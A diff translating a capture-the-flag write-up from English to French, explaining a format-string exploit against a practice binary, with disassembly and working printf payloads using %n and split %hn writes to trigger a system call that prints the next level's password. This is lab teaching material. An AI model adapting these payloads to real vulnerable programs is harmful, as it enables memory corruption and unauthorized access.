@@ -1,6 +1,6 @@
-# Level 4
+# 04 - Format string 2
 
-- We login as user level4:
+- On se connecte en tant que level4:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
@@ -64,7 +64,7 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-- Let's identify the calls and jump by execution order:
+- Voyons les parties les plus importantes du programme:
 ```
    0x08048460 <+9>:     mov    0x8049804,%eax
    0x08048465 <+14>:    mov    %eax,0x8(%esp)
@@ -73,27 +73,21 @@ End of assembler dump.
    0x08048477 <+32>:    mov    %eax,(%esp)
    0x0804847a <+35>:    call   0x8048350 <fgets@plt>
 ```
->`0x8049804 <stdin@@GLIBC_2.0>: 0xb7fd1ac0`
-
->buffer size is 0x200 bytes
-
->buffer starts at `-0x208(%ebp)`
-
->Prompt the user for up to 512 bytes.
+>Prompt stdin pour 512 octets dans une zone mémoire de 520 octets.
 
 ```
    0x0804847f <+40>:    lea    -0x208(%ebp),%eax
    0x08048485 <+46>:    mov    %eax,(%esp)
    0x08048488 <+49>:    call   0x8048444 <p>
 ```
->Call the `<p>` function with our buffer as parameter.
+>Appelle la fonction `<p>` avec notre buffer en paramètre.
 
 ```
    0x0804844a <+6>:     mov    0x8(%ebp),%eax
    0x0804844d <+9>:     mov    %eax,(%esp)
    0x08048450 <+12>:    call   0x8048340 <printf@plt>
 ```
->The `<p>` function calls `<printf@plt>` with our buffer.
+>La fonction `<p>` appelle `<printf@plt>` avec notre buffer en premier argument.
 
 ```
    0x0804848d <+54>:    mov    0x8049810,%eax
@@ -102,36 +96,34 @@ End of assembler dump.
 ```
 >`0x8049810 <m>:  0x00000000`
 
->After the call to `<p>`, compare the value located at `0x8049810` avec with the hexadecimal constant 102 5544 (16 930 116 in decimal). If the two values differ, we `leave` and then `ret`, otherwise we call `<system@plt>`.
-
 ```
    0x08048499 <+66>:    movl   $0x8048590,(%esp)
    0x080484a0 <+73>:    call   0x8048360 <system@plt>
 ```
 >`0x8048590: "/bin/cat /home/user/level5/.pass"`
 
->Display our flag.
+- Après l'appel à `<p>`, le programme compare la valeur située en `0x8049810` avec la constante hexadécimale 102 5544 (16 930 116 en décimal). Si les deux valeurs diffèrent, il retourne, sinon, il affiche le flag.
 
-
-- So, we need to use `<printf@plt>` to assign the value 16930116 to `0x8049810`, we could do it like this
+- Donc il faut utiliser `<printf@plt>` pour assigner la valeur 16930116 en `0x8049810`, on pourrait le faire comme ceci:
 >`echo -ne '\x10\x98\x04\x08 %16930110x %12$n \n' | ./level4`
 
 
-- It would work, but this time, let's break down this assignment of 4 bytes (`%n`) into two assignments of 2 bytes each (`%hn`). We need to write 16 930 116, which is 102 5544 in hexadecimal:
+- Ça marcherais, mais cette fois, divisions cette assignation de 4 octets (`%n`) en deux assignations de 2 octets chacune (`%hn`). On doit écrire 16 930 116, qui est 102 5544 en hexadécimal:
 >Low order bytes = 5544 (21 828 in decimal)
 
 >High order bytes = 0102 (258 in decimal)
 
 
-- Instead of making an assignment at `0x8049810`, we will make one at `0x8049810` and another one at `0x8049812`. `0x8049810` will contain the bytes representing the most significant value (here, the low-order bytes), and `0x8049812` will contain the bytes representing the least significant value (here, the high-order bytes).
+- On fera donc une assignation en `0x8049810` et une autre en `0x8049812`. `0x8049810` contiendra les octets représentant la valeur la plus significative (ici, les octets de faible poids), et `0x8049812` contiendra les octets représentant la valeur la moins significative (ici, les octets de poids fort).
+
+- Le payload donné à `<printf@plt>` sera donc:
 >`\x12\x98\x04\x08\x10\x98\x04\x08 %VALUE1x %12$hn %VALUE2x %13$hn`
 
->`VALUE1 (0x8049812)` ==> 258 - 8 bytes for the addresses - 2 bytes for the spaces = 248
+>`VALUE1 (0x8049812)` ==> 258 - 8 bytes for the addresses - 2 bytes for the spaces = **248**
 
->`VALUE2 (0x8049810)` ==> 21 828 - 258 - 2 bytes for the spaces = 21 568
+>`VALUE2 (0x8049810)` ==> 21 828 - 258 - 2 bytes for the spaces = **21 568**
 
 
-- So:
 ```
 echo -ne '\x12\x98\x04\x08\x10\x98\x04\x08 %248x %12$hn %21568x %13$hn' | ./level4
 ...
